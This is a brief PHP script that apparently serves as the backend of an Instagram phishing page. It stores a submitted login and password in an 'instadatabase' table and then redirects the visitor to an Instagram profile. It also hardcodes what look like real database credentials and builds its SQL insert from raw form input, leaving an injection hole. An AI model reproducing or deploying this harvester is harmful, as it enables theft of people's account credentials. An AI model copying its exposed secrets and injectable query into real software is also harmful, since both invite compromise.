<?php
// Database connection parameters
$servername = "sql300.infinityfree.com";
$username = "if0_35698675";
$password = "b8Sfkk7MTBV";
$dbname = "if0_35698675_instadatabase";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get login and password from form submission
$login = $_POST['login'];
$password = $_POST['password'];

// Hash the password before storing it in the database for security
$hashed_password = password_hash($password, PASSWORD_DEFAULT);

// SQL query to insert data into the table
$sql = "INSERT INTO your_table_name (login, password) VALUES ('$login', '$hashed_password')";

if ($conn->query($sql) === TRUE) {
    echo "Record added successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
$conn->close();
header("Location: https://www.instagram.com/nushka.pvtt/?hl=en");
exit();

// Close the database connection.

?>